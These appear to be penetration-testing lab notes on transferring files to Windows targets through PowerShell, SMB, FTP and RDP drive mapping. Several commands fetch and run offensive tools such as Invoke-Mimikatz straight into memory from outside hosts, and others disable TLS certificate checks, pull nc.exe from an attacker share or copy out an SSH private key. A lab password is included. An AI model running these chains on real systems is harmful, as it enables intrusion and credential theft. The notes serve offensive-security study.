# PowerShell
## PowerShell Base64 Encode & Decode
Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content
### Check SSH Key MD5 Hash
```
md5sum id_rsa
```
### Encode SSH Key to Base64
```
cat id_rsa |base64 -w 0;echo
```
We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```
C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<stringvalue>")
```
confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## PowerShell Web Downloads
### PowerShell DownloadFile Method 
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
```
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
### PowerShell DownloadString - Fileless Method
PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
IEX also accepts pipeline input.
```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
### PowerShell Invoke-WebRequest
From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
### Common Errors with PowerShell
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. his can be bypassed using the parameter -UseBasicParsing
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
`Error Output`
```
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
```
```
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
# SMB Downloads
## Create the SMB Server
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
## Copy a File from the SMB Server
```
C:\htb> copy \\[AttackerIP]\share\nc.exe
```
## New versions of Windows block unauthenticated guest access
### Create the SMB Server with a Username and Password
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
### Mount the SMB Server with Username and Password
```
C:\htb> net use n: \\[AttackerIP]\share /user:test test
```
### Copy a file from the SMB server
```
C:\ copy n:\nc.exe
```
# FTP Downloads
## FTP Client 
We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server
```
python3 -m pyftpdlib -p 21 --write
```
## Transferring Files from an FTP Server Using PowerShell
```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://[AttackerIP]/file.txt', 'C:\Users\Public\ftp-file.txt')
```
When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
# Transfer files through cmd without a Desktop Experience role
```
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```
```
net use 
```
```
Status       Local     Remote                    Network

-------------------------------------------------------------------------------
\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.
```
```
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 
```
